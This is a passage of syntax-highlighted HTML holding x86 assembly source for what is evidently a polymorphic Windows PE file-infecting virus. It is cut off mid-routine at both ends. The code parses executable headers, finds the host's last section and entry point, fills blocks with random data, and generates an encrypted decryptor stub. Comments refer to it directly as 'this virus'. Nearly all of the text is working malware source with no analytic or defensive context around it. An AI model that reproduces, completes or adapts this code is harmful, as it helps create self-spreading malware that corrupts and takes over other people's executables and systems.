                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">search_raw</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">MZ_lfanew</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">lodsd</span><span class="sc0">
                </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">FH_NumberOfSections</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">err_RVA2RAW</span><span class="sc0">
                </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">FH_SizeOfOptionalHeader</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">IMAGE_SIZEOF_FILE_HEADER</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">

        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
                </span><span class="sc1">;Get the IMAGE_SECTION_HEADER that contains RVA</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc1">;At this point:</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc1">;ebx -&gt; File base address</span><span class="sc0">
                </span><span class="sc1">;esi -&gt; Pointer to IMAGE_OPTIONAL_HEADER</span><span class="sc0">
                </span><span class="sc1">;edi -&gt; Pointer to first section header</span><span class="sc0">
                </span><span class="sc1">;ecx -&gt; Number of sections</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">;Check if address of imports directory is inside this</span><span class="sc0">
                </span><span class="sc1">;section</span><span class="sc0">
        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">


</span><span class="sc5">s_img_section</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">search_raw</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">SH_VirtualAddress</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">SH_VirtualSize</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">section_ok</span><span class="sc0">

        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;Go to next section header</span><span class="sc0">
        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">out_of_section</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">IMAGE_SIZEOF_SECTION_HEADER</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">s_img_section</span><span class="sc0">
</span><span class="sc5">err_RVA2RAW</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">ret</span><span class="sc0">

        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;Get raw</span><span class="sc0">
        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">section_ok</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">SH_PointerToRawData</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Get code section header and entry-point information</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;On entry:</span><span class="sc0">
</span><span class="sc1">;       ebx -&gt; Host base address</span><span class="sc0">
</span><span class="sc1">;On exit:</span><span class="sc0">
</span><span class="sc1">;       ecx -&gt; Pointer to RAW data or NULL if error</span><span class="sc0">
</span><span class="sc1">;       edx -&gt; Entry-point RVA</span><span class="sc0">
</span><span class="sc1">;       esi -&gt; Pointer to IMAGE_OPTIONAL_HEADER</span><span class="sc0">
</span><span class="sc1">;       edi -&gt; Pointer to section header</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">get_code_sh</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_last_sh</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">OH_AddressOfEntryPoint</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">RVA2RAW</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Get pointer to last section header</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;On entry:</span><span class="sc0">
</span><span class="sc1">;       ebx -&gt; Host base address</span><span class="sc0">
</span><span class="sc1">;On exit:</span><span class="sc0">
</span><span class="sc1">;       esi -&gt; IMAGE_OPTIONAL_HEADER</span><span class="sc0">
</span><span class="sc1">;       edi -&gt; Pointer to last section header                </span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">get_last_sh</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">MZ_lfanew</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">cld</span><span class="sc0">
                </span><span class="sc6">lodsd</span><span class="sc0">
                </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">FH_NumberOfSections</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">IMAGE_SIZEOF_SECTION_HEADER</span><span class="sc0">
                </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">FH_SizeOfOptionalHeader</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">IMAGE_SIZEOF_FILE_HEADER</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;This routine takes a string pointed by esi and copies</span><span class="sc0">
</span><span class="sc1">;it into a buffer pointed by edi</span><span class="sc0">
</span><span class="sc1">;The result string will be converted to upper-case</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;On entry:</span><span class="sc0">
</span><span class="sc1">;       esi -&gt; Pointer to source string</span><span class="sc0">
</span><span class="sc1">;       edi -&gt; Pointer to returned string</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;On exit:</span><span class="sc0">
</span><span class="sc1">;       al  -&gt; Null</span><span class="sc0">
</span><span class="sc1">;       edx -&gt; Points to filename at the end of path</span><span class="sc0">
</span><span class="sc1">;       edi -&gt; Points 1byte above the null terminator</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">parse_filename</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
</span><span class="sc5">ScanZstring</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">lodsb</span><span class="sc0">               
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc3">"a"</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">no_upper</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc3">"z"</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">no_upper</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0DFh</span><span class="sc0">
</span><span class="sc5">no_upper</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc13">"\"
</span><span class="sc0">        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">err_slash_pos</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc5">err_slash_pos</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">ScanZstring</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Generate data area suitable for memory write access</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       edi -&gt; Base address</span><span class="sc0">
</span><span class="sc1">;       ecx -&gt; Size</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">gen_data_area</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">

        </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">NumberOfDataAreas</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">NUM_DA</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">no_more_da</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">tbl_data_area</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">*</span><span class="sc2">08h</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">map_is_here</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">host_base</span><span class="sc4">]</span><span class="sc0">
                
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">virus_sh</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc5">SH_PointerToRawData</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc5">SH_VirtualAddress</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">00000004h</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">

        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">NumberOfDataAreas</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">no_more_da</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Generate a block of random data</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">gen_rnd_block</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0000000Ah</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd_range</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">             
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">gen_data_area</span><span class="sc0">
</span><span class="sc5">rnd_fill</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">cld</span><span class="sc0">
</span><span class="sc5">rnd_fill_loop</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd32</span><span class="sc0">              
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">rnd_fill_loop</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">                

</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Linear congruent pseudorandom number generator</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">get_rnd32</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">rnd32_seed</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">41C64E6Dh</span><span class="sc0">
                </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00003039h</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">7FFFFFFFh</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">rnd32_seed</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Returns a random num between 0 and entry eax</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">get_rnd_range</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd32</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">  
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Perform encryption</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">

        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;This buffer will contain the code to "crypt" the virus code</span><span class="sc0">
                </span><span class="sc1">;followed by a RET instruction</span><span class="sc0">
        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">perform_crypt</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">90h</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Generate decryptor action: Load pointer</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;We dont need to get delta-offset, this virus assumes fixed load address</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">gen_load_ptr</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0B8h</span><span class="sc0"> 
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">index_mask</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">host_base</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">PtrToCrypt</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ptr_disp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">virus_sh</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc5">SH_PointerToRawData</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc5">SH_VirtualAddress</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">build_flags</span><span class="sc4">],</span><span class="sc5">CRYPT_DIRECTION</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">fix_dir_ok</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;Fix upon direction</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">fixed_size2ecx</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">oper_size</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">fix_dir_ok</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">stosd</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Generate decryptor action: Load counter</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">

        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;Easy now, just move counter random initial value</span><span class="sc0">
                </span><span class="sc1">;into counter reg and calculate the end value</span><span class="sc0">
        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">gen_load_ctr</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0B8h</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">counter_mask</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">fixed_size2ecx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd32</span><span class="sc0">
